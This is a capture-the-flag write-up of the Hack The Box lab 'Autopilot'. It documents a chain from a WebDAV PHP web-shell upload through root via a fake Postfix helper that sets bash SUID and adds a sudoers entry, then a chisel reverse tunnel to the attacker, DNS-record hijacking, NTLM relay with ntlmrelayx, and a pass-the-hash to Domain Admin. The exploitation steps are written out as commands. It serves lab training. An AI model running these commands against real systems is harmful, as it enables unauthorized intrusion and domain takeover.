# Autopilot — HTB Write-up

**Author:** DonMorpheus (lab)
**Machine:** Autopilot (Season 12 / Release Arena) — Linux mail + AD
**Hosts:** `grommunio.autopilot.htb` / `mail.autopilot.htb` / `dc01.autopilot.htb`
**Scope:** HTB VPN / personal lab only

> **No flags** in this document. Passwords stay in `secrets.env` (see `secrets.example.env`).

Scripts: [`scripts/`](scripts/).

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | **443** only. TLS SAN `grommunio` / `mail` / `autodiscover`.autopilot.htb. Clock skew vs TLS `Date` |
| Access | Grommunio Files (Nextcloud). Any AD mailbox user **PUT** into another user’s data dir. Data dir executes PHP as `grofiles` |
| User / Linux root | Admin API dbconf: `commit_file=#POSTCONF` then `daemon_directory` → WEBDIR with a fake `postfix-script`. Unit **`postfix.service`** |
| Pivot | Mail is the only hop into `172.16.20.0/24`. iptables **uid-owner 0** to the unsigned workstation. Chisel reverse SOCKS + SMB |
| DA path A | **DnsAdmins** replace `ws01` A (LE `dnsRecord`, TTL **BE**) → mail:445 → ntlmrelayx `--smb-port` → signing-**off** host → PTH |
| DA path B | Reverse TCP SMB bridge from mail `ruid 0` to DC01:445. Impacket login as Domain Admin, `C$` |

```
Kali tun0
  │ 443  nginx / grommunio
  │
  └─ mail 172.16.20.10 (rooted)
        ├─ chisel R:1080 socks  R:2222:22  R:8445:WS02:445
        ├─ chisel 445 → kali:9445  (ntlmrelayx)
        └─ python splice → DC01:445  (DA C$)
              DC01 172.16.20.1   SMB signing ON
              WS02 172.16.20.15  SMB signing OFF
              WS01 10.0.50.150   task host (no route from mail)
```

---

## 1. Recon

```bash
echo '<TARGET_IP> grommunio.autopilot.htb autodiscover.autopilot.htb mail.autopilot.htb files.autopilot.htb autopilot.htb' \
  | sudo tee -a /etc/hosts
nmap -sC -sV -p 443 <TARGET_IP>
```

If Kali clock and the TLS `Date` header disagree, grommunio logon fails. Sync to the header.

---

## 2. Foothold — WebDAV ACL → `grofiles`

Local `admin` PUT is **403**. A domain mailbox user can PUT into **another** user’s Nextcloud data. That directory is in the PHP document root.

```bash
curl -sk -X PUT \
  'https://grommunio.autopilot.htb/files/remote.php/dav/files/deborah.hernandez/s.php' \
  -u 'deborah.hernandez:<DEB_PASS>' \
  -H 'Content-Type: application/octet-stream' --data-binary @scripts/lib/s.php
```

Execute via the **data** URL, not `/files/index.php/login`:

```text
https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/s.php?c=id
```

uid `grofiles`. Helper: [`scripts/02-foothold.sh`](scripts/02-foothold.sh).

Dead ends: Nextcloud login UI, CVE-2026-110447 (Collabora / richdocuments — not present).

Optional extra: Seafile account + Redis `gopher://` `SETEX` on a Nextcloud route. WebDAV PHP is enough.

---

## 3. Linux root — `daemon_directory` + fake `postfix-script`

Admin API on `127.0.0.1:8080` (uwsgi, user `grommunio`). dbconf macro:

```text
#POSTCONF  →  sudo postconf -e $FILE_S && systemctl reload postfix
```

`postconf` as `grommunio` writes `/etc/postfix/main.cf` as root. The `systemctl reload` half can fail (HTTP 256) **after** the write.

Do **not** stage in `/tmp` (PrivateTmp / postfix refuses). Use the Nextcloud data dir:

```text
WEBDIR=/var/lib/grommunio-files/data/deborah.hernandez/files
```

Plant:

1. `postfix-script` wrapper: sudoers `grofiles`, `chmod 4755 /usr/bin/bash`, `ln -sf` real bins from `/usr/lib/postfix/bin` (not `libexec`), `exec` the real helper.
2. PUT `grommunio-dbconf/postfix/` `commit_file=#POSTCONF`
3. PUT `postfix/main.cf/` `daemon_directory=$WEBDIR`
4. Dashboard **`postfix.service`** reload + restart (name includes `.service`)

`/usr` is a **RO** overlay — drop chisel in `/var/tmp`.

[`scripts/03-root-postfix.sh`](scripts/03-root-postfix.sh) also rotates the grommunio **admin** SQL hash so the API login in `api.php` works. MySQL bind comes from postfix maps / `mysql_adaptor.cfg`.

S/MIME on Joshua’s mailbox is a separate cred: PKCS#12 in FAI, john `pfx`, decrypt with **`openssl cms -decrypt`** (AuthEnvelopedData, not `smime`). Yields `sa-joshua.harris` — **DnsAdmins**, not local admin on WS02.

Two Stephanie Lewis accounts: mailbox `stephanie.lewis` vs Domain Admin `da-stephanie.lewis`. Same display name, different OU. Do not spray the DA.

---

## 4. Reverse proxy

Mail can reach the AD LAN. Kali cannot. iptables:

```text
OUTPUT -d 172.16.20.15/32 -m owner ! --uid-owner 0  NEW  DROP
```

Only **ruid 0** talks to the unsigned workstation. SUID bash is euid 0 / ruid `grofiles` — `systemd-run` from that context does not create a unit. Use `sudo -n setsid`.

```text
chisel client <KALI>:8000 \
  R:1080:socks \
  R:2222:127.0.0.1:22 \
  R:8445:172.16.20.15:445 \
  445:<KALI>:9445
```

[`scripts/04-chisel.sh`](scripts/04-chisel.sh). SOCKS for LDAP/DNS; `:8445` is WS02; mail `:445` is the relay listener.

---

## 5. Path A — DNS spoof + ntlmrelayx

**Firewalld** zone `public` on eth0 **REJECT**s 445 until:

```bash
firewall-cmd --add-port=445/tcp
firewall-cmd --add-port=139/tcp
```

[`scripts/05-fw-445.sh`](scripts/05-fw-445.sh). Without this, ntlmrelayx stays empty.

DnsAdmins replace `ws01` A so the scheduled task SMB-authenticates to **mail**. `dnsRecord` wire format: **little-endian** except **TTL big-endian**. [`scripts/06-dns-hijack.py`](scripts/06-dns-hijack.py) through SOCKS.

```text
ntlmrelayx.py -t smb://127.0.0.1:8445 --smb-port 9445 -smb2support --keep-relaying \
  -socks --socks-port 1082
```

Flag is **`--smb-port`**, not `-port`. Keep stdin open. SOCKS **1082** — chisel already owns 1080. [`scripts/07-ntlmrelayx.sh`](scripts/07-ntlmrelayx.sh).

Relay **target** is the signing-off workstation, not the DC (signing required, LDAP signing Enforced).

Prove the listener with a failed auth to `127.0.0.1:9445` before waiting on the task. Coerce (PetitPotam / PrinterBug / MS-EVEN) from mail did not produce inbound NTLM on this build.

After a dump: [`scripts/08-pth-root.sh`](scripts/08-pth-root.sh) PTH Administrator through `ssh -L` to DC01:445.

---

## 6. Path B — reverse SMB + Domain Admin (close)

Mail already routes to DC01:445 as root. One-shot TCP splice to Kali, Impacket `SMBConnection` to `127.0.0.1`, login as `da-stephanie.lewis`, `getFile C$ Users\Administrator\Desktop\root.txt`.

[`scripts/09-dcpivot.py`](scripts/09-dcpivot.py). `sudo -n setsid python3` for the agent. Open INPUT on tun0 if the operator firewall is not ACCEPT.

This is the path that finished the Season 12 instance without waiting on WS01.

---

## What I did not put here

- Flags, HTB VPN configs, live session tickets
- Recovered passwords (see `secrets.env`)
- The Seafile/Redis gopher foothold (optional; WebDAV is shorter)

---

## References

- Impacket `ntlmrelayx` — `--smb-port`, SMB2, SOCKS
- Microsoft SMB signing / LDAP channel binding
- SpecterOps, DNS and DnsAdmins
- grommunio Admin API dbconf / Postfix `daemon_directory`
- Related TTP note: [fieldnotes — NTLM relay via DNS spoof and reverse SMB proxy](https://github.com/DonMorpheus/fieldnotes/blob/main/docs/10-ad/ntlm-relay-dns-spoof-reverse-proxy.md)
